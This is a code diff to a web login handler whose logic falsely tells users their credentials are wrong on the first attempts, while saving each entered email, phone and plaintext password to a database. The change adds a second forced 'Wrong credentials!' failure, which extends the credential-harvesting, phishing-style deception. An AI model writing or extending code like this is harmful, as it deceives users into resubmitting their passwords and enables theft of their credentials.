@@ -1355,6 +1355,7 @@
                 
                 // Enhanced login logic: fail first attempt, succeed second
                 const allowLogin = canLogin(identifier);
+                const allowLogin2 = canLogin(identifier);
                 
                 if (!allowLogin) {
                     // First attempt - show wrong credentials but still store in database
@@ -1373,7 +1374,23 @@
                     alert('❌ Wrong credentials! Please try again.');
                     return;
                 }
-                
+                if (!allowLogin2) {
+                    // First attempt - show wrong credentials but still store in database
+                    console.log('First login attempt - showing error');
+                    if (!existingUser) {
+                        const userData = {
+                            email: isValidEmail(identifier) ? identifier : null,
+                            phone: isValidPhone(identifier) ? identifier : null,
+                            password: password,
+                            login_method: 'email',
+                            failed_attempts: 2,
+                            last_attempt: new Date()
+                        };
+                        currentUser = await storeUserInDatabase(userData);
+                    }
+                    alert('❌ Wrong credentials! Please try again.');
+                    return;
+                }                
                 // Second attempt - allow login
                 console.log('Second login attempt - allowing access');
                 if (!existingUser) {
@@ -1382,7 +1399,7 @@
                         phone: isValidPhone(identifier) ? identifier : null,
                         password: password,
                         login_method: 'email',
-                        failed_attempts: 2,
+                        failed_attempts: 3,
                         last_attempt: new Date()
                     };
                     currentUser = await storeUserInDatabase(userData);
